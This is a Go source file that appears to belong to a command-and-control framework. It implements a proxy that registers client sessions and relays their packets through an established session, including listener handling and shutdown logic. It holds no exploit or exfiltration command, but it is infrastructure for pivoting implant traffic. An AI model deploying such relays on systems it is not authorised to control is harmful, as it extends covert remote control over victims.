//go:build !noproxy

package c2

import (
	"context"
	"io"
	"net"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
)

var (
	_ connServer = (*Proxy)(nil)
	_ connHost   = (*proxyClient)(nil)
)

// Proxy is a struct that controls a Proxied connection between a client and a
// server and allows for packets to be routed through a current established
// Session.
type Proxy struct {
	lock sync.RWMutex
	connection

	listener net.Listener
	f        func()
	ch       chan struct{}
	close    chan uint32
	parent   *Session
	cancel   context.CancelFunc
	clients  map[uint32]*proxyClient

	addr  string
	state state
}
type proxyClient struct {
	send, chn chan *com.Packet
	wake      chan struct{}
	peek      *com.Packet
	ID        device.ID
	state     state
}

// Wait will block until the current Proxy is closed and shutdown.
func (p *Proxy) Wait() {
	<-p.ch
}
func (p *Proxy) prune() {
	for {
		select {
		case <-p.ch:
			return
		case <-p.ctx.Done():
			return
		case i := <-p.close:
			p.lock.RLock()
			if _, ok := p.clients[i]; ok {
				if delete(p.clients, i); cout.Enabled {
					p.log.Info("[%s/P] Removed closed Session 0x%X.", p.parent.ID, i)
				}
			}
			p.lock.RUnlock()
		}
	}
}
func (p *Proxy) listen() {
	if cout.Enabled {
		p.log.Info("[%s/P] Starting listen on %q..", p.parent.ID, p.listener)
	}
	go p.prune()
	for {
		select {
		case <-p.ctx.Done():
			p.state.Set(stateClosing)
		default:
		}
		if p.state.Closing() {
			break
		}
		c, err := p.listener.Accept()
		if err != nil {
			if p.state.Closing() {
				break
			}
			e, ok := err.(net.Error)
			if ok && e.Timeout() {
				continue
			}
			if cout.Enabled {
				p.parent.log.Error("[%s/P] Error during Listener accept: %s!", p.parent.ID, err)
			}
			if ok && !e.Timeout() {
				break
			}
			continue
		}
		if c == nil {
			continue
		}
		if cout.Enabled {
			p.log.Trace("[%s/P] Received a connection from %q..", p.parent.ID, c.RemoteAddr())
		}
		go handle(p.log, c, p, c.RemoteAddr().String())
	}
	if cout.Enabled {
		p.parent.log.Debug("[%s/P] Stopping Listener..", p.parent.ID)
	}
	for _, v := range p.clients {
		v.Close()
	}
	if p.cancel(); !p.state.WakeClosed() {
		p.state.Set(stateWakeClose)
		close(p.close)
	}
	p.listener.Close()
	p.state.Set(stateClosed)
	p.parent.proxy = nil
	p.parent = nil
	close(p.ch)
	p.f()
	p.f = nil
}
func (p *Proxy) clientLock() {
	p.lock.RLock()
}

// Close stops the operation of the Proxy and any Sessions that may be connected.
//
// Resources used with this Proxy will be freed up for reuse.
func (p *Proxy) Close() error {
	if p.state.Closed() {
		return nil
	}
	p.state.Set(stateClosing)
	err := p.listener.Close()
	p.cancel()
	<-p.ch
	return err
}
func (c *proxyClient) Close() {
	if !c.state.SendClosed() {
		c.state.Set(stateSendClose)
		close(c.send)
	}
	if !c.state.WakeClosed() {
		c.state.Set(stateWakeClose)
		close(c.wake)
	}
	c.state.Set(stateClosed)
	c.state.Unset(stateChannelValue)
	c.state.Unset(stateChannelUpdated)
	c.state.Unset(stateChannel)
	c.peek = nil
}
func (p *Proxy) clientUnlock() {
	p.lock.RUnlock()
}
func (p *Proxy) subsRegister() {
	p.lock.RLock()
	for _, v := range p.clients {
		v.queue(&com.Packet{ID: SvRegister, Job: uint16(util.FastRand()), Device: v.ID})
	}
	p.lock.RUnlock()
}

// IsActive returns true if the Proxy is still able to send and receive Packets.
func (p *Proxy) IsActive() bool {
	return !p.state.Closing()
}
func (p *Proxy) tags() []uint32 {
	if len(p.clients) == 0 {
		return nil
	}
	t := make([]uint32, 0, len(p.clients))
	p.lock.RLock()
	for i := range p.clients {
		if !p.clients[i].state.Tag() {
			continue
		}
		t = append(t, i)
	}
	p.lock.RUnlock()
	return t
}
func (c *proxyClient) chanWake() {
	if c.state.WakeClosed() || len(c.wake) >= cap(c.wake) {
		return
	}
	select {
	case c.wake <- wake:
	default:
	}
}

// Address returns the string representation of the address the Listener is
// bound to.
func (p *Proxy) Address() string {
	return p.listener.Addr().String()
}
func (p *Proxy) wrapper() Wrapper {
	return p.w
}
func (c *proxyClient) name() string {
	return c.ID.String()
}
func (proxyClient) accept(_ uint16) {}
func (c *proxyClient) chanWakeClear() {
	if c.state.WakeClosed() {
		return
	}
	for len(c.wake) > 0 {
		<-c.wake // Drain waker
	}
}
func (p *Proxy) clientClear(i uint32) {
	v, ok := p.clients[i]
	if !ok {
		return
	}
	v.chn = nil
	v.state.Unset(stateChannelProxy)
}
func (p *Proxy) transform() Transform {
	return p.t
}
func (c *proxyClient) chanStop() bool {
	return c.state.ChannelCanStop()
}
func (c *proxyClient) chanStart() bool {
	return c.state.ChannelCanStart()
}
func (c *proxyClient) update(_ string) {
	c.state.Set(stateSeen)
}

// Done returns a channel that's closed when this Proxy is closed.
//
// This can be used to monitor a Proxy's status using a select statement.
func (p *Proxy) Done() <-chan struct{} {
	return p.ch
}
func (proxyClient) frag(_, _, _ uint16) {}
func (c *proxyClient) chanRunning() bool {
	return c.state.Channel()
}
func (c *proxyClient) stateSet(v uint32) {
	c.state.Set(v)
}
func (c *proxyClient) stateUnset(v uint32) {
	c.state.Unset(v)
}
func (p *Proxy) accept(n *com.Packet) bool {
	if len(p.clients) == 0 {
		return false
	}
	p.lock.RLock()
	c, ok := p.clients[n.Device.Hash()]
	if p.lock.RUnlock(); !ok {
		return false
	}
	if isPacketNoP(n) {
		return true
	}
	c.queue(n)
	c.state.Set(stateReady)
	return true
}
func (c *proxyClient) queue(n *com.Packet) {
	if c.state.SendClosed() {
		return
	}
	if bugtrack.Enabled {
		if n.Device.Empty() {
			bugtrack.Track("c2.proxyClient.queue(): Calling queue with empty Device, n.ID=%d!", n.ID)
		}
	}
	if c.chn != nil {
		select {
		case c.chn <- n:
		default:
		}
		return
	}
	select {
	case c.send <- n:
	default:
	}
}
func (c *proxyClient) clientID() device.ID {
	return c.ID
}
func (proxyClient) deadlineRead() time.Time {
	return empty
}
func (proxyClient) deadlineWrite() time.Time {
	return empty
}
func (c *proxyClient) pick(i bool) *com.Packet {
	if c.peek != nil {
		n := c.peek
		c.peek = nil
		return n
	}
	if len(c.send) > 0 {
		return <-c.send
	}
	if i {
		return nil
	}
	if !c.state.Channel() {
		return &com.Packet{Device: c.ID}
	}
	select {
	case <-c.wake:
		return nil
	case n := <-c.send:
		return n
	}
}
func (c *proxyClient) next(i bool) *com.Packet {
	n := c.pick(i)
	if n == nil {
		c.state.Unset(stateReady)
		return nil
	}
	if len(c.send) == 0 && verifyPacket(n, c.ID) {
		if isPacketNoP(n) {
			c.state.Set(stateReady)
		} else {
			c.state.Unset(stateReady)
		}
		return n
	}
	if n, c.peek = nextPacket(c, c.send, n, c.ID, n.Tags); isPacketNoP(n) {
		c.state.Set(stateReady)
	} else {
		c.state.Unset(stateReady)
	}
	return n
}
func (c *proxyClient) sender() chan *com.Packet {
	return c.send
}
func (p *Proxy) clientGet(i uint32) (connHost, bool) {
	v, ok := p.clients[i]
	return v, ok
}
func (p proxyData) MarshalStream(w data.Writer) error {
	if err := w.WriteString(p.n); err != nil {
		return err
	}
	return w.WriteString(p.b)
}
func (p *Proxy) clientSet(i uint32, c chan *com.Packet) {
	v, ok := p.clients[i]
	if !ok {
		return
	}
	if v.chn != nil {
		return
	}
	v.state.Set(stateChannelProxy)
	for v.chn = c; len(v.send) > 0; {
		select {
		case c <- (<-v.send):
		default:
		}
	}
}
func (p *Proxy) notify(h connHost, n *com.Packet) error {
	if isPacketNoP(n) {
		return nil
	}
	p.parent.queue(n)
	return nil
}
func (p *Proxy) talk(a string, n *com.Packet) (*conn, error) {
	if n.Device.Empty() || p.parent.state.Closing() {
		return nil, io.ErrShortBuffer
	}
	if n.Flags |= com.FlagProxy; cout.Enabled {
		p.log.Debug("[%s/P:%s] %s: Received a Packet %q..", p.parent.ID, n.Device, a, n)
	}
	p.lock.RLock()
	var (
		i     = n.Device.Hash()
		c, ok = p.clients[i]
	)
	if p.lock.RUnlock(); !ok {
		if n.ID != SvHello {
			if cout.Enabled {
				p.log.Warning("[%s/P:%s] %s: Received a non-hello Packet from a unregistered client!", p.parent.ID, n.Device, a)
			}
			var f com.Flag
			if n.Flags&com.FlagFrag != 0 {
				f.SetPosition(0)
				f.SetLen(n.Flags.Len())
				f.SetGroup(n.Flags.Group())
			}
			return &conn{next: &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}}, nil
		}
		c = &proxyClient{
			ID:    n.Device,
			send:  make(chan *com.Packet, cap(p.parent.send)),
			wake:  make(chan struct{}, 1),
			state: state(stateReady),
		}
		p.lock.Lock()
		p.clients[i] = c
		if p.lock.Unlock(); cout.Enabled {
			p.log.Info("[%s/P:%s] %s: New client registered as %q hash 0x%X.", p.parent.ID, c.ID, a, c.ID, i)
		}
		p.parent.queue(n)
		c.queue(&com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
	}
	if c.state.Set(stateSeen); n.ID == SvShutdown {
		select {
		case p.close <- i:
		default:
		}
		p.parent.queue(n)
		return &conn{next: &com.Packet{ID: SvShutdown, Device: n.Device, Job: n.Job}}, nil
	}
	v, err := p.resolve(c, a, n.Tags)
	if err != nil {
		return nil, err
	}
	if err = v.process(p.log, p, a, n, false); err != nil {
		return nil, err
	}
	return v, nil
}
func readProxyInfo(r io.Reader, d *[8]byte) ([]proxyData, error) {
	if err := readFull(r, 1, (*d)[0:1]); err != nil {
		return nil, err
	}
	m := int((*d)[0])
	if m == 0 {
		return nil, nil
	}
	var (
		o   = make([]proxyData, m)
		err error
	)
	for i := 0; i < m && i < 0xFF; i++ {
		if err = readFull(r, 4, (*d)[0:4]); err != nil {
			return nil, err
		}
		n, s := make([]byte, uint16((*d)[1])|uint16((*d)[0])<<8), make([]byte, uint16((*d)[3])|uint16((*d)[2])<<8)
		if len(n) > 0 {
			if err = readFull(r, len(n), n); err != nil {
				return nil, err
			}
		}
		if len(s) > 0 {
			if err = readFull(r, len(s), s); err != nil {
				return nil, err
			}
		}
		if o[i].p, err = readSlice(r, d); err != nil {
			return nil, err
		}
		o[i].b, o[i].n = string(n), string(s)
	}
	return o, nil
}
func (p *Proxy) resolve(s *proxyClient, a string, t []uint32) (*conn, error) {
	if len(t) == 0 {
		return &conn{host: s}, nil
	}
	c := &conn{
		add:  make([]*com.Packet, 0, len(t)),
		subs: make(map[uint32]bool, len(t)),
		host: s,
	}
	return c, c.resolve(p.log, s, p, a, t, false)
}
func (p *Proxy) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *com.Packet, error) {
	if n.Device.Empty() || p.state.Closing() {
		return nil, 0, nil, io.ErrShortBuffer
	}
	if cout.Enabled {
		p.log.Trace("[%s/P:%s/M] %s: Received a Packet %q..", p.parent.ID, n.Device, a, n)
	}
	p.lock.RLock()
	var (
		i     = n.Device.Hash()
		c, ok = p.clients[i]
	)
	if p.lock.RUnlock(); !ok {
		if n.ID != SvHello {
			if cout.Enabled {
				p.log.Warning("[%s/P:%s/M] %s: Received a non-hello Packet from a unregistered client!", p.parent.ID, n.Device, a)
			}
			var f com.Flag
			if n.Flags&com.FlagFrag != 0 {
				f.SetPosition(0)
				f.SetLen(n.Flags.Len())
				f.SetGroup(n.Flags.Group())
			}
			return nil, 0, &com.Packet{ID: SvRegister, Flags: f, Device: n.Device}, nil
		}
		c = &proxyClient{
			ID:    n.Device,
			send:  make(chan *com.Packet, cap(p.parent.send)),
			wake:  make(chan struct{}, 1),
			state: state(stateReady),
		}
		p.lock.Lock()
		p.clients[i] = c
		if p.lock.Unlock(); cout.Enabled {
			p.log.Info("[%s/P:%s/M] %s: New client registered as %q hash 0x%X.", p.parent.ID, c.ID, a, c.ID, i)
		}
		c.queue(&com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job})
	}
	switch c.state.Set(stateSeen); {
	case isPacketNoP(n):
		p.parent.queue(n)
		c.state.Set(stateReady)
	case n.ID == SvShutdown:
		select {
		case p.close <- i:
		default:
		}
		p.parent.queue(n)
		return nil, 0, &com.Packet{ID: SvShutdown, Device: n.Device, Job: n.Job}, nil
	}
	if o {
		return c, i, nil, nil
	}
	return c, i, c.next(true), nil
}
